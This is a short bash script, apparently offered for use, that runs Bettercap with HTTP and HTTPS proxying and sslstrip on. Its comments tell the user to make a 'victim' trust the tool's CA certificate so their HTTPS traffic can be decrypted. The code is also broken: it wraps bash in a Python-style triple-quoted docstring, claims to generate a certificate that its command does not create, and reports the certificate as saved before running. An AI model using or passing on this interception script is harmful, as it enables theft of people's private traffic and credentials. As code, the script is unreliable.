#!/bin/bash


"""
    To decrypt HTTPS traffic, install Bettercap's CA certificate on target devices: 
    --> This must be served on the victim before the attack starts.
    --> The victim must trust the CA certificate. 
    ##### The certificate will be saved to ~/.bettercap-ca.cert.pem. Distribute this to victim
"""

bettercap_ca() {
# Generate a CA certificate
bettercap -eval "http.proxy on; https.proxy on; http.proxy.sslstrip true;"
}

main() {
    echo "[+] CA certificate saved to ~/.bettercap-ca.cert.pem"
    bettercap_ca
    echo "[!] Distribute this to the victim"
}
main